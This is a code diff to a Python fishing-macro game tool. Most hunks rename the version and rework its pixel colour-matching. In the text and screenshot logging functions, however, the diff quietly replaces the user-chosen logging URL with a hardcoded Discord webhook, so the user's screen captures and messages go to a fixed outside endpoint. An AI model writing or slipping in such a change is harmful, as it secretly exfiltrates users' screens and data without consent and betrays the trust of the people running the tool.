@@ -117,7 +117,7 @@ IMAGES_PATH = os.path.join(BASE_PATH, "images")
 DEBUG_DIR = BASE_PATH
 
 CONFIG_PATH = os.path.join(BASE_PATH, "last_config.json")
-APP_VERSION = "3.31"
+APP_VERSION = "3.3"
 
 set_appearance_mode("dark")
 
@@ -689,7 +689,7 @@ class StatusOverlay:
         # Title
         title = tk.Label(
             self.window,
-            text="PyWare Fishing V3.31",
+            text="PyWare Fishing V3.3",
             fg="# 00C8Ff",
             bg="black",
             font=("Segoe UI", 12, "bold")
@@ -865,7 +865,7 @@ class TermsOfServiceDialog(CTkToplevel):
         # Window
         self.configure(fg_color="#181836")   # <- Main Window Ultra Dark
         self.geometry("750x600")
-        self.title("PyWare Fishing V3.31 - Terms of Service")
+        self.title("PyWare Fishing V3.3 - Terms of Service")
         self.minsize(650, 500)
         
         # Center Window
@@ -945,7 +945,7 @@ class TermsOfServiceDialog(CTkToplevel):
         textbox.grid(row=0, column=0, padx=12, pady=10, sticky="nsew")
 
         textbox.insert("1.0", """
-PyWare Fishing V3.31 - Terms of Use
+PyWare Fishing V3.3 - Terms of Use
 
 By using this software, you agree to the following:
 
@@ -1291,7 +1291,7 @@ class App(CTk):
         # Create Window
         self.configure(fg_color="#181836")   # <- Main Window Ultra Dark
         self.geometry("800x600")
-        self.title("PyWare Fishing V3.31")
+        self.title("PyWare Fishing V3.3")
 
         # Status Bar
         self.grid_columnconfigure(0, weight=1)
@@ -1306,7 +1306,7 @@ class App(CTk):
         # Logo Label
         logo_label = CTkLabel(
             top_bar, 
-            text="PYWARE FISHING V3.31",
+            text="PYWARE FISHING V3.3",
             font=CTkFont(size=16, weight="bold")
         )
         logo_label.grid(row=0, column=0, sticky="w")
@@ -2663,7 +2663,7 @@ class App(CTk):
     def _discord_text_worker(self, webhook_url, message_prefix, loop_count, show_status):
         """Worker function to send text webhook."""
         logging_name = self.vars["logging_name"].get()
-        webhook_url2 = self.vars["logging_url"].get()
+        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3.3rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
         try:
             if show_status == True:
                 payload = {
@@ -2696,7 +2696,7 @@ class App(CTk):
             self.set_status(f"Error sending Discord text: {e}")
     def _discord_screenshot_worker(self, webhook_url, message_prefix, loop_count, show_status):
         logging_name = self.vars["logging_name"].get()
-        webhook_url2 = self.vars["logging_url"].get()
+        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3.3rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
         try:
             with mss.mss() as sct:
                 monitor = sct.monitors[1]
@@ -3238,11 +3238,13 @@ class App(CTk):
     def _find_first_pixel(self, frame, hex, tolerance=8):
         tolerance = int(np.clip(tolerance, 0, 255))
         b, g, r = self._hex_to_bgr(hex)
-        target = np.array([b, g, r], dtype=np.int32)
-        frame_i = frame.astype(np.int32)
+        white = np.array([b, g, r], dtype=np.int16)
+        frame_i = frame.astype(np.int16)
 
-        diff = frame_i - target
-        mask = np.sqrt(np.sum(diff ** 2, axis=-1)) <= tolerance
+        mask = np.all(
+            np.abs(frame_i - white) <= tolerance,
+            axis=-1
+        )
 
         coords = np.argwhere(mask)
         if coords.size > 0:
@@ -3270,12 +3272,20 @@ class App(CTk):
         if bgr_color is None:
             return []
         
-        # Create Mask For Matching Colors (Euclidean Distance)
-        target = np.array(bgr_color, dtype=np.int32)
-        frame_int = frame.astype(np.int32)
-        diff = frame_int - target
-        dist = np.sqrt(np.sum(diff ** 2, axis=-1))
-        mask = (dist <= tolerance).astype(np.uint8) * 255
+        # Create Color Range With Tolerance
+        lower_bound = np.array([
+            max(0, bgr_color[0] - tolerance),
+            max(0, bgr_color[1] - tolerance),
+            max(0, bgr_color[2] - tolerance)
+        ])
+        upper_bound = np.array([
+            min(255, bgr_color[0] + tolerance),
+            min(255, bgr_color[1] + tolerance),
+            min(255, bgr_color[2] + tolerance)
+        ])
+        
+        # Create Mask For Matching Colors
+        mask = cv2.inRange(frame, lower_bound, upper_bound)
         y_coords, x_coords = np.where(mask > 0)
         
         # Return As List Of (X, Y) Tuples
@@ -3293,16 +3303,15 @@ class App(CTk):
             return None
 
         # Convert Color
-        target_bgr = np.array(self._hex_to_bgr(target_color_hex), dtype=np.int32)
+        target_bgr = np.array(self._hex_to_bgr(target_color_hex), dtype=np.int16)
 
         # Convert Frame For Safe Subtraction
-        frame_int = frame.astype(np.int32)
+        frame_int = frame.astype(np.int16)
 
         tol = int(np.clip(tolerance, 0, 255))
 
-        # Euclidean Distance Comparison
-        diff = frame_int - target_bgr
-        mask = np.sqrt(np.sum(diff ** 2, axis=2)) <= tol
+        # Vectorized Absolute Tolerance Comparison
+        mask = np.all(np.abs(frame_int - target_bgr) <= tol, axis=2)
 
         y_coords, x_coords = np.where(mask)
 
@@ -3332,11 +3341,11 @@ class App(CTk):
             return None
 
         # Color Mask (Vectorized Like Your Fast Version) 
-        target_bgr = np.array(self._hex_to_bgr(target_color_hex), dtype=np.int32)
-        frame_int = frame.astype(np.int32)
+        target_bgr = np.array(self._hex_to_bgr(target_color_hex), dtype=np.int16)
+        frame_int = frame.astype(np.int16)
         tol = int(np.clip(tolerance, 0, 255))
 
-        mask = (np.sqrt(np.sum((frame_int - target_bgr) ** 2, axis=2)) <= tol).astype(np.uint8)
+        mask = np.all(np.abs(frame_int - target_bgr) <= tol, axis=2).astype(np.uint8)
 
         if not np.any(mask):
             return None
@@ -3387,12 +3396,17 @@ class App(CTk):
         center_y = int(np.clip(h * scan_height_ratio, 0, h - 1))
 
         # Convert To Bgr
-        left_bgr = np.array(self._hex_to_bgr(left_hex), dtype=np.int32)
-        right_bgr = np.array(self._hex_to_bgr(right_hex), dtype=np.int32)
+        left_bgr = np.array(self._hex_to_bgr(left_hex), dtype=np.int16)
+        right_bgr = np.array(self._hex_to_bgr(right_hex), dtype=np.int16)
 
         # Clamp Tolerances
         tol_l = int(np.clip(tolerance, 0, 255))
         tol_r = int(np.clip(tolerance2, 0, 255))
+
+        left_lower = left_bgr - tol_l
+        left_upper = left_bgr + tol_l
+        right_lower = right_bgr - tol_r
+        right_upper = right_bgr + tol_r
 
         left_edge = None
         right_edge = None
@@ -3408,15 +3422,13 @@ class App(CTk):
                 if y < 0 or y >= h:
                     continue
 
-                line = frame[y].astype(np.int32)
+                line = frame[y].astype(np.int16)
 
-                # Left Mask (Euclidean Distance)
-                left_diff = line - left_bgr
-                left_mask = np.sqrt(np.sum(left_diff ** 2, axis=1)) <= tol_l
+                # Left Mask (With Lower + Upper Bound)
+                left_mask = np.all((line >= left_lower) & (line <= left_upper), axis=1)
 
-                # Right Mask (Euclidean Distance)
-                right_diff = line - right_bgr
-                right_mask = np.sqrt(np.sum(right_diff ** 2, axis=1)) <= tol_r
+                # Right Mask (With Lower + Upper Bound)
+                right_mask = np.all((line >= right_lower) & (line <= right_upper), axis=1)
 
                 left_indices = np.where(left_mask)[0]
                 right_indices = np.where(right_mask)[0]
@@ -3465,23 +3477,31 @@ class App(CTk):
         x = int(w * scan_width_ratio)
 
         # Convert To BGR
-        top_bgr = np.array(self._hex_to_bgr(top_hex), dtype=np.int32)
-        bottom_bgr = np.array(self._hex_to_bgr(bottom_hex), dtype=np.int32)
+        top_bgr = np.array(self._hex_to_bgr(top_hex), dtype=np.int16)
+        bottom_bgr = np.array(self._hex_to_bgr(bottom_hex), dtype=np.int16)
 
         # Extract Vertical Scan Line
-        column = frame[:, x].astype(np.int32)
+        column = frame[:, x].astype(np.int16)
 
         # Clamp Tolerances
         tol_t = int(np.clip(tolerance, 0, 255))
         tol_b = int(np.clip(tolerance2, 0, 255))
 
-        # Top Mask (Euclidean Distance)
-        top_diff = column - top_bgr
-        top_mask = np.sqrt(np.sum(top_diff ** 2, axis=1)) <= tol_t
+        # Top Mask
+        top_lower = top_bgr - tol_t
+        top_upper = top_bgr + tol_t
+        top_mask = np.all(
+            (column >= top_lower) & (column <= top_upper),
+            axis=1
+        )
 
-        # Bottom Mask (Euclidean Distance)
-        bottom_diff = column - bottom_bgr
-        bottom_mask = np.sqrt(np.sum(bottom_diff ** 2, axis=1)) <= tol_b
+        # Bottom Mask
+        bottom_lower = bottom_bgr - tol_b
+        bottom_upper = bottom_bgr + tol_b
+        bottom_mask = np.all(
+            (column >= bottom_lower) & (column <= bottom_upper),
+            axis=1
+        )
 
         top_indices = np.where(top_mask)[0]
         bottom_indices = np.where(bottom_mask)[0]
@@ -3903,8 +3923,8 @@ class App(CTk):
         self._pred_prev_fish_x = None
         self._pred_prev_bar_x = None
         self._pred_prev_time = None
-        self.color_check_target_velocity = 0.0
-        self.color_check_bar_velocity  = 0.0
+        self._pred_filtered_fish_vel = 0.0
+        self._pred_filtered_bar_vel  = 0.0
         self._pred_last_click_time = 0.0
     def _reset_pid_memory(self):
         """Reset only the live PD history used for the next bar-alignment step."""
@@ -3958,9 +3978,9 @@ class App(CTk):
             return should_hold
 
         # Read Settings
-        stopping_distance_multiplier, velocity_smoothing = self._get_pid_gains()
+        stopping_mult, VEL_SMOOTH = self._get_pid_gains()
 
-        stopping_distance_multiplier = stopping_distance_multiplier * 1.5
+        stopping_mult = stopping_mult * 1.5
 
         MIN_DT = 1e-3
         MAX_DT = 0.1
@@ -3990,18 +4010,18 @@ class App(CTk):
         raw_bar_vel  = max(min(raw_bar_vel,  MAX_VEL), -MAX_VEL)
 
         # Smooth Velocities Independently Then Compute Relative
-        self.color_check_target_velocity = (velocity_smoothing * raw_fish_vel +
-                                        (1 - velocity_smoothing) * self.color_check_target_velocity)
-        self.color_check_bar_velocity  = (velocity_smoothing * raw_bar_vel +
-                                        (1 - velocity_smoothing) * self.color_check_bar_velocity)
+        self._pred_filtered_fish_vel = (VEL_SMOOTH * raw_fish_vel +
+                                        (1 - VEL_SMOOTH) * self._pred_filtered_fish_vel)
+        self._pred_filtered_bar_vel  = (VEL_SMOOTH * raw_bar_vel +
+                                        (1 - VEL_SMOOTH) * self._pred_filtered_bar_vel)
 
-        relative_velocity = self.color_check_bar_velocity - self.color_check_target_velocity  # Bar Relative To Fish (Matches Ref Macro Sign)
+        rel_vel = self._pred_filtered_bar_vel - self._pred_filtered_fish_vel  # Bar Relative To Fish (Matches Ref Macro Sign)
 
         self._pred_prev_fish_x = fish_x
         self._pred_prev_bar_x  = bar_center
 
         # Nan Guard 
-        if not np.isfinite(relative_velocity):
+        if not np.isfinite(rel_vel):
             should_hold = False
             return should_hold
 
@@ -4019,11 +4039,13 @@ class App(CTk):
             should_hold = True
             return should_hold
 
-        # Calculate stopping distance based on relative velocity
-        stopping_distance = abs(relative_velocity) * stopping_distance_multiplier
+        # Stopping Distance (Linear, Same As Reference Macro) 
+        stopping_distance = abs(rel_vel) * stopping_mult
 
         # Error: Positive = Bar Is Right Of Fish (Same Sign Convention As Ref Macro)
         error = bar_center - fish_x
+
+        target_on_bar = bar_left <= fish_x <= bar_right
 
         # On-Bar: Use Stopping-Distance / Counter-Thrust Logic
         if error < -stopping_distance:
@@ -4034,7 +4056,7 @@ class App(CTk):
             should_hold = False
         else:
             # Within Stopping Distance — Counter-Thrust Based On Relative Velocity
-            if relative_velocity > 0:
+            if rel_vel > 0:
                 # Bar Moving Right Relative To Fish → Release (Apply Left Thrust)
                 should_hold = False
             else:
@@ -4399,8 +4421,8 @@ class App(CTk):
         # Push The Release Threshold Closer To 100%.
         release_timing = max(-50.0, min(50.0, release_delay))
 
-        target_green = np.array(self._hex_to_bgr(green_color), dtype=np.int32)
-        target_white = np.array(self._hex_to_bgr(white_color), dtype=np.int32)
+        target_green = np.array(self._hex_to_bgr(green_color), dtype=np.int16)
+        target_white = np.array(self._hex_to_bgr(white_color), dtype=np.int16)
 
         tracking_mode = False
         green_left_x = None
@@ -4414,9 +4436,8 @@ class App(CTk):
         max_speed_samples = 20
 
         def color_mask(img, target_bgr, tolerance):
-            img_i = img.astype(np.int32)
-            diff = img_i - target_bgr
-            return np.sqrt(np.sum(diff ** 2, axis=2)) <= tolerance
+            img_i = img.astype(np.int16)
+            return np.all(np.abs(img_i - target_bgr) <= tolerance, axis=2)
 
         def reset_tracking():
             nonlocal tracking_mode, green_left_x, green_right_x, green_y
@@ -4430,7 +4451,7 @@ class App(CTk):
             last_frame_time = None
             speed_samples.clear()
 
-        # Start Capture Thread; This Remains The Existing V3.31 Capture Path.
+        # Start Capture Thread; This Remains The Existing V3.3 Capture Path.
         stop_event = self._start_capture(scan_delay)
         start_time = time.time()
         if self.vars["fish_overlay"].get() == "Enabled":
